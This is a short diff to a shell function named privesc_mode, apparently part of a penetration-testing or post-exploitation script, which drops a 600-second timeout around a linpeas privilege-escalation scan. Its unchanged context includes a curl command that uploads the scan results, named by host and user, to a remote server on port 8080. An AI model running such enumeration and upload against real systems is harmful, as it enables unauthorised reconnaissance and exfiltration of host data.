@@ -116,7 +116,8 @@ privesc_mode() {
     chmod +x linpeas
 
     trap 'echo "[*] linpeas interrupted, continuing..."' INT
-    timeout 600 ./linpeas -a -q | tee "${HOSTNAME}_${USERNAME}_linpeas.txt" || true
+    ./linpeas -a -q | tee "${HOSTNAME}_${USERNAME}_linpeas.txt" || true
+    # timeout 600 ./linpeas -a -q | tee "${HOSTNAME}_${USERNAME}_linpeas.txt" || true
     trap - INT
 
     curl -s -F "file=@${HOSTNAME}_${USERNAME}_linpeas.txt" "http://$SERVER_IP:8080/p" || echo "[-] Failed to send file"
